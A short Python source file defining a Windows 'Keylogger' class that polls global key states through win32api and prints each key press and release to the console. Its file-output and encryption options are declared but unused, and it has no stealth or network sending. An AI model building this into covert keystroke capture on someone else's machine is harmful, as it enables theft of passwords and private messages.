import win32api

KEYS = "1234567890qwertyuiopåasdfghjkløæzxcvbnm".upper()
keystates = {"H": False}

def updateNumbersAndLetters(keystates: dict):
    newDict = keystates.copy()
    for key, pressedDown in keystates.items():
        if (win32api.GetAsyncKeyState(ord(key))):
            if (not newDict[key]):
                print(key, "pressed down")

            newDict[key] = True
        else:
            if (newDict[key]):
                print(key, "let go")

            newDict[key] = False

    return newDict


class Keylogger:
    def __init__(self, timer:int=True, outfile: str="out.txt", encryption:bool=False) -> None:
        self.timer = timer
        self.outfile = outfile
        self.encryption = encryption

        self.keystates = {letter: False for letter in KEYS}

    def updateKeystates(self):
        self.keystates = updateNumbersAndLetters(self.keystates)

    def start(self):
        while (self.timer):
            self.updateKeystates()

    def stop(self):
        self.timer = False
